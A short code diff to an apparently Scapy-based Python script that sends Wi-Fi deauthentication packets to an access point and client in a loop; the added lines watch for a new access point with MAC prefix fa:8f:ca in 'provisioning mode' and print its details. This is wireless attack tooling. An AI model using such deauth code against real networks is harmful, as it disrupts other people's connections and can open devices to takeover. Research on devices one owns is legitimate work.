@@ -80,6 +80,12 @@ def main(interface):
 		print(f"Send deauth #{i}...", flush=True)
 		sendp(deauth_pkt_for_ap, iface=interface)
 		sendp(deauth_pkt_for_client, iface=interface)
+		
+		# While sending deauth look for the new AP with starting mac prefix:  fa:8f:ca
+		for ap_mac in wireless_access_points:
+			if ap_mac.startswith("fa:8f:ca"):
+				print(f"Found a matching provisioning mode AP")
+				pprint.PrettyPrinter().pprint(wireless_access_points[ap_mac])
 
 		time.sleep(1)
 
